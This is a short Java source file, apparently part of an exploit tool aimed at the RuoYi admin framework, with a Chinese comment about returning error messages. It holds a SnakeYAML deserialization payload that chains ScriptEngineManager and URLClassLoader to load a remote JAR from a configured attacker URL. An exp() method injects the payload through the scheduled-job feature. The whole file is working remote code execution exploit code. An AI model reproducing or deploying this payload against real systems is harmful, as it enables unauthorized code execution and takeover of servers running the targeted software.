package com.ruoyi.exp;

import com.ruoyi.global.Config;
import com.ruoyi.util.JobUtil;

public class YamlExp {
    public static final String yamlPayload = "org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"{jarUrl}\"]]]]')";

    // 返回异常信息（如有）
    public static String exp(){
        JobUtil.clearLog();
        return JobUtil.expJob(yamlPayload.replace("{jarUrl}", Config.snakeyamlUrl));
    }
}
